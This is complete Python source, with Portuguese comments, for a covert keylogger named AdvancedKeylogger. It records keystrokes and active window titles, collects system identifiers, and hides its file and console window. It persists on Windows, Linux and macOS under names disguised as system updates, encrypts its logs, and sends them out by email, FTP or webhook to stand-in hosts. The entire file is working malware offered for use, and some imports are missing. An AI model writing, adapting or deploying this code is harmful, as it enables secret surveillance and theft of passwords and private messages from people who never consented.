#!/usr/bin/env python3
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import sys
import tempfile
import zipfile
import platform
import getpass
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import base64
import requests
import ctypes
import win32gui
import win32con

class AdvancedKeylogger:
    def __init__(self, interval=300, report_method="file", email="", password="", smtp_server="smtp.gmail.com", smtp_port=587):
        # Configurações básicas
        self.interval = interval  # Intervalo de relatório em segundos
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        
        # Método de relatório (file, email, ftp, webhook)
        self.report_method = report_method
        
        # Configurações de e-mail
        self.email = email
        self.password = password
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        
        # Configurações de criptografia
        self.crypto_key = hashlib.sha256(b'32_character_long_secret_key_here!!').digest()
        self.crypto_iv = b'16_bytes_iv_here!'
        
        # Configurações de persistência
        self.hidden = True
        self.persistence = True
        
        # Informações do sistema
        self.system_info = self.get_system_info()
        
        # Nome do arquivo de log
        self.filename = f"kl_{self.system_info['username']}_{self.start_dt.strftime('%Y-%m-%d_%H-%M-%S')}.log"
        
        # Janelas ativas monitoradas
        self.active_window = ""
        self.last_window = ""
        
        # Configurações de ofuscação
        self.obfuscate = True
        self.obfuscation_level = 3
        
        # Configurações de captura avançada
        self.capture_special_keys = True
        self.capture_clipboard = False  # Alterar com cuidado - pode ser detectado
        self.capture_screenshots = False  # Requer pillow
        self.screenshot_interval = 600  # 10 minutos
        
        # Inicialização
        self.setup_persistence()
        self.hide_script()

    def get_system_info(self):
        """Coleta informações detalhadas do sistema"""
        try:
            info = {
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "hostname": platform.node(),
                "processor": platform.processor(),
                "username": getpass.getuser(),
                "ip_address": self.get_ip_address(),
                "mac_address": self.get_mac_address()
            }
            return info
        except:
            return {}

    def get_ip_address(self):
        """Obtém o endereço IP público"""
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "Unknown"

    def get_mac_address(self):
        """Obtém o endereço MAC"""
        try:
            if platform.system() == "Windows":
                import uuid
                return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
            else:
                import fcntl, socket, struct
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', bytes(15)))
                return ':'.join(['%02x' % char for char in info[18:24]])
        except:
            return "Unknown"

    def encrypt_data(self, data):
        """Criptografa dados com AES-CBC"""
        cipher = AES.new(self.crypto_key, AES.MODE_CBC, self.crypto_iv)
        padded_data = pad(data.encode(), AES.block_size)
        return base64.b64encode(cipher.encrypt(padded_data)).decode()

    def decrypt_data(self, encrypted_data):
        """Descriptografa dados com AES-CBC"""
        cipher = AES.new(self.crypto_key, AES.MODE_CBC, self.crypto_iv)
        decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
        return unpad(decrypted, AES.block_size).decode()

    def obfuscate_log(self, log):
        """Ofusca os dados do log"""
        if not self.obfuscate:
            return log
            
        # Níveis de ofuscação
        if self.obfuscation_level >= 1:
            log = log.replace("\n", "|||")
            
        if self.obfuscation_level >= 2:
            log = base64.b64encode(log.encode()).decode()
            
        if self.obfuscation_level >= 3:
            log = self.encrypt_data(log)
            
        return log

    def deobfuscate_log(self, log):
        """Desofusca os dados do log"""
        if not self.obfuscate:
            return log
            
        # Níveis de ofuscação (ordem inversa)
        if self.obfuscation_level >= 3:
            log = self.decrypt_data(log)
            
        if self.obfuscation_level >= 2:
            log = base64.b64decode(log.encode()).decode()
            
        if self.obfuscation_level >= 1:
            log = log.replace("|||", "\n")
            
        return log

    def get_active_window(self):
        """Obtém a janela ativa no Windows"""
        try:
            if platform.system() == "Windows":
                window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                return window if window else "Unknown"
            return "Unknown"
        except:
            return "Unknown"

    def on_key_press(self, event):
        """Callback para cada pressionamento de tecla"""
        try:
            current_window = self.get_active_window()
            
            # Registrar mudança de janela
            if current_window != self.active_window:
                self.active_window = current_window
                self.log += f"\n\n[Window: {current_window} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n"
            
            # Processar tecla pressionada
            if event.event_type == "down":
                key = event.name
                
                # Tratamento especial para algumas teclas
                if len(key) > 1:
                    if key == "space":
                        key = " "
                    elif key == "enter":
                        key = "[ENTER]\n"
                    elif key == "decimal":
                        key = "."
                    elif self.capture_special_keys:
                        key = f"[{key.upper()}]"
                    else:
                        key = ""
                
                self.log += key
                
        except Exception as e:
            print(f"Error in key press: {e}")

    def setup_persistence(self):
        """Configura persistência no sistema"""
        if not self.persistence:
            return
            
        try:
            if platform.system() == "Windows":
                self.setup_windows_persistence()
            elif platform.system() == "Linux":
                self.setup_linux_persistence()
            elif platform.system() == "Darwin":
                self.setup_macos_persistence()
        except Exception as e:
            print(f"Persistence setup failed: {e}")

    def setup_windows_persistence(self):
        """Configura persistência no Windows"""
        try:
            # Caminho para copiar o executável
            appdata = os.getenv('APPDATA')
            dest_path = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsUpdate.exe')
            
            # Se não for um arquivo .py, assumimos que é um executável
            if not sys.argv[0].endswith('.py'):
                if not os.path.exists(dest_path):
                    shutil.copy2(sys.argv[0], dest_path)
            else:
                # Para scripts Python, criamos um executável
                try:
                    import pyinstaller
                    # Cria um executável temporário
                    temp_dir = tempfile.mkdtemp()
                    pyinstaller.run([
                        '--onefile',
                        '--windowed',
                        '--name=WindowsUpdate',
                        f'--distpath={temp_dir}',
                        sys.argv[0]
                    ])
                    # Copia para a pasta de inicialização
                    exe_path = os.path.join(temp_dir, 'WindowsUpdate.exe')
                    if os.path.exists(exe_path):
                        shutil.copy2(exe_path, dest_path)
                except:
                    pass
                    
            # Adiciona ao registro
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                
                with winreg.OpenKey(key, key_value, 0, winreg.KEY_WRITE) as reg_key:
                    winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, dest_path)
            except:
                pass
                
        except Exception as e:
            print(f"Windows persistence failed: {e}")

    def setup_linux_persistence(self):
        """Configura persistência no Linux"""
        try:
            # Cria um arquivo oculto no diretório home
            dest_path = os.path.expanduser("~/.config/systemd-service")
            
            # Copia o script
            if not sys.argv[0].endswith('.py'):
                if not os.path.exists(dest_path):
                    shutil.copy2(sys.argv[0], dest_path)
                    os.chmod(dest_path, 0o755)
            else:
                # Tenta criar um executável
                try:
                    with open(dest_path, 'w') as f:
                        f.write(f"#!/bin/sh\npython3 {os.path.abspath(sys.argv[0])}")
                    os.chmod(dest_path, 0o755)
                except:
                    pass
                    
            # Adiciona ao crontab
            cron_job = f"@reboot {dest_path}"
            with open('/etc/crontab', 'a') as f:
                f.write(f"\n{cron_job}\n")
                
        except Exception as e:
            print(f"Linux persistence failed: {e}")

    def setup_macos_persistence(self):
        """Configura persistência no macOS"""
        try:
            # Cria um arquivo oculto
            dest_path = os.path.expanduser("~/Library/Application Support/.macOSUpdate")
            
            # Copia o script
            if not sys.argv[0].endswith('.py'):
                if not os.path.exists(dest_path):
                    shutil.copy2(sys.argv[0], dest_path)
                    os.chmod(dest_path, 0o755)
            else:
                # Tenta criar um executável
                try:
                    with open(dest_path, 'w') as f:
                        f.write(f"#!/bin/sh\npython3 {os.path.abspath(sys.argv[0])}")
                    os.chmod(dest_path, 0o755)
                except:
                    pass
                    
            # Cria um LaunchAgent
            plist_content = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.apple.macosupdate</string>
                <key>ProgramArguments</key>
                <array>
                    <string>{dest_path}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
            </plist>
            """
            
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.macosupdate.plist")
            with open(plist_path, 'w') as f:
                f.write(plist_content)
                
        except Exception as e:
            print(f"macOS persistence failed: {e}")

    def hide_script(self):
        """Tenta ocultar o script"""
        if not self.hidden:
            return
            
        try:
            if platform.system() == "Windows":
                # Esconde o arquivo
                fileattr = 0x02  # FILE_ATTRIBUTE_HIDDEN
                if not sys.argv[0].endswith('.py'):
                    ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], fileattr)
                    
                # Esconde a janela do console
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                if console_window:
                    ctypes.windll.user32.ShowWindow(console_window, 0)
        except:
            pass

    def save_log(self):
        """Salva o log em um arquivo local"""
        try:
            # Cria um diretório temporário oculto
            temp_dir = os.path.join(tempfile.gettempdir(), ".kl_data")
            os.makedirs(temp_dir, exist_ok=True)
            
            if platform.system() == "Windows":
                # Esconde o diretório no Windows
                fileattr = 0x02  # FILE_ATTRIBUTE_HIDDEN
                ctypes.windll.kernel32.SetFileAttributesW(temp_dir, fileattr)
            
            # Salva o log
            log_path = os.path.join(temp_dir, self.filename)
            
            # Adiciona informações do sistema ao log
            full_log = f"=== System Info ===\n{json.dumps(self.system_info, indent=2)}\n\n"
            full_log += f"=== Key Logs ===\n{self.log}"
            
            # Ofusca e salva o log
            obfuscated_log = self.obfuscate_log(full_log)
            
            with open(log_path, "a") as f:
                f.write(obfuscated_log)
                
            # Limpa o log atual
            self.log = ""
            
            # Agenda o próximo salvamento
            self.end_dt = datetime.now()
            timer = Timer(interval=self.interval, function=self.save_log)
            timer.daemon = True
            timer.start()
            
            # Envia o relatório conforme configurado
            self.send_report(log_path)
            
        except Exception as e:
            print(f"Error saving log: {e}")

    def send_report(self, log_path):
        """Envia o relatório conforme o método configurado"""
        try:
            if self.report_method == "email":
                self.send_email(log_path)
            elif self.report_method == "ftp":
                self.send_ftp(log_path)
            elif self.report_method == "webhook":
                self.send_webhook(log_path)
            elif self.report_method == "file":
                # Já foi salvo no arquivo
                pass
                
            # Opcional: remove o arquivo local após o envio
            if self.report_method != "file":
                os.remove(log_path)
                
        except Exception as e:
            print(f"Error sending report: {e}")

    def send_email(self, log_path):
        """Envia o log por e-mail"""
        try:
            # Lê o conteúdo do log
            with open(log_path, "r") as f:
                log_content = f.read()
                
            # Cria a mensagem
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = f"Keylogger Report - {self.system_info['username']} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Corpo do e-mail
            body = f"Keylogger report for {self.system_info['username']} on {self.system_info['hostname']}\n\n"
            body += f"Time period: {self.start_dt} to {self.end_dt}\n"
            body += f"Platform: {self.system_info['platform']}\n"
            msg.attach(MIMEText(body, 'plain'))
            
            # Anexa o arquivo de log
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(log_content)
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_path)}')
            msg.attach(attachment)
            
            # Envia o e-mail
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.send_message(msg)
                
        except Exception as e:
            print(f"Error sending email: {e}")

    def send_ftp(self, log_path):
        """Envia o log via FTP"""
        try:
            import ftplib
            # Configurações FTP (deveriam ser parâmetros)
            ftp_host = "ftp.example.com"
            ftp_user = "username"
            ftp_pass = "password"
            
            with ftplib.FTP(ftp_host, ftp_user, ftp_pass) as ftp:
                with open(log_path, 'rb') as f:
                    ftp.storbinary(f'STOR {os.path.basename(log_path)}', f)
                    
        except Exception as e:
            print(f"Error sending via FTP: {e}")

    def send_webhook(self, log_path):
        """Envia o log para um webhook"""
        try:
            webhook_url = "https://example.com/webhook"  # Deveria ser um parâmetro
            
            with open(log_path, 'r') as f:
                log_content = f.read()
                
            payload = {
                "username": self.system_info['username'],
                "hostname": self.system_info['hostname'],
                "platform": self.system_info['platform'],
                "start_time": self.start_dt.isoformat(),
                "end_time": self.end_dt.isoformat(),
                "log_data": log_content
            }
            
            requests.post(webhook_url, json=payload, timeout=10)
            
        except Exception as e:
            print(f"Error sending to webhook: {e}")

    def start(self):
        """Inicia o keylogger"""
        try:
            # Inicia o listener do teclado
            keyboard.on_release(callback=self.on_key_press)
            
            # Inicia o salvamento periódico
            self.save_log()
            
            # Mantém o script em execução
            keyboard.wait()
            
        except Exception as e:
            print(f"Keylogger error: {e}")
        finally:
            # Garante que os logs finais sejam salvos
            if self.log:
                self.save_log()

if __name__ == "__main__":
    # Configurações - modifique conforme necessário
    keylogger = AdvancedKeylogger(
        interval=300,  # Salva a cada 5 minutos
        report_method="file",  # file, email, ftp, webhook
        email="your_email@gmail.com",  # Necessário se report_method="email"
        password="your_password",  # Necessário se report_method="email"
        smtp_server="smtp.gmail.com",
        smtp_port=587
    )
    
    keylogger.start()
